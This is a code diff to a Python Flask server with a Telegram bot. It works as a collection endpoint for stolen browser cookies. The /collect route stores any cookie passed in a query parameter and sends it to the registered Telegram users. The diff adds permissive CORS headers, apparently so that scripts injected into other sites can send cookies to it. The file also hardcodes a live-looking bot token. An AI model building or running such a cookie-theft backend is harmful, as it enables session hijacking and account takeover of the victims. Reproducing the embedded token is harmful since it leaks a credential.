@@ -5,13 +5,19 @@ import time
 
 app = Flask(__name__)
 
-# Токен твоего бота
 TOKEN = '8693453531:AAFwUMH_otrs4oxV_lGMdokUVKQTjX3mN64'
 bot = telebot.TeleBot(TOKEN)
 
-# Хранилище пользователей и кук (в памяти)
 users = set()
 cookies = []
+
+# === ЭТОТ БЛОК ДОБАВЛЯЕТ CORS-ЗАГОЛОВКИ ===
+@app.after_request
+def add_cors_headers(response):
+    response.headers['Access-Control-Allow-Origin'] = '*'
+    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
+    response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
+    return response
 
 @app.route('/')
 def index():
@@ -26,7 +32,6 @@ def collect():
     cookie = request.args.get('cookie')
     if cookie:
         cookies.append(cookie)
-        # Рассылаем всем зарегистрированным пользователям
         for user_id in list(users):
             try:
                 bot.send_message(user_id, f'🍪 Новая кука: {cookie}')
@@ -44,9 +49,6 @@ def register(user_id):
 @app.route('/users')
 def users_list():
     return str(list(users))
-
-# Обработчик команды /start для бота (вебхук не нужен, просто регистрация)
-# Мы будем регистрировать пользователя через GET-запрос
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
